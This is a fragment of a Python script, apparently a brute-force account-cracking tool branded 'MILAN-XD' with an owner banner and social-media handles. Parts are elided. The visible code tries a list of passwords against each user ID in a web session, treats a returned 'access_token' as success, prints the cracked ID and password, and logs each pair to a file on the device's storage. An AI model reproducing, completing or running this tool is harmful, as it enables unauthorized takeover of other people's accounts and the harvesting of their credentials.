...
if bit == '64bit':
 ...
 #───────────────[BIT End]───────────────────────── #
sys.stdout.write('\x1b]2; [MILAN-XD]\x07')
def clear():
    os.system('clear')
    print(logo)
logo=(""" \033[1;38m
...
\033[1;92m----------------------------------------------
\033[1;32m OWNER    : MILAN HWRE
\033[1;32m FACEBOOK : «⃜͢͢ « 𓆩 MILAN𓆪   •⃛͢𓆪»̊3:) 🩷
\033[1;92m GITHUB   : MILAN HWRE
\033[1;95m WHATSAPP : MILAN LIMBU \033[1;90m(MILAN HWRE)
\033[1;34m VERSION  : \033[1;33m 0.5
\033[1;35m STATUS   : APROWAL
\033[1;92m-----------------------------------------------""")
#[===================CLEAR======================]#
def clear():
    axp("clear")
        ...
        for ps in pas:
            with requests.Session() as session:
                ...
                if "access_token" in response:
                    print(f"\n\033[1;32m[MILAN-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")
                    open("/sdcard/MILAN-XD.txt", "a").write(uid + "|" + ps + "\n")
                    ok+=1
                    break
